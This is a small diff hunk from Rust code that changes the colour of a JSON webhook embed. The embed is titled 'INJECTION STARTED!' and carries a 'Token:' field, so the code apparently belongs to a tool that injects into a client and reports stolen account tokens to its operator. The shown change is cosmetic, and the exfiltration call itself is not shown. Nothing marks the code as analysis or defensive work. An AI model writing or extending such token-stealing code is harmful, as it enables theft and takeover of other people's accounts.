@@ -162,7 +162,7 @@ let payload = serde_json::json!({
     "embeds": [
         {
             "title": "**INJECTION STARTED!**",
-            "color": 0x3498db,
+            "color": 0xEBA519,
             "fields": [
                 {
                     "name": "Token:",
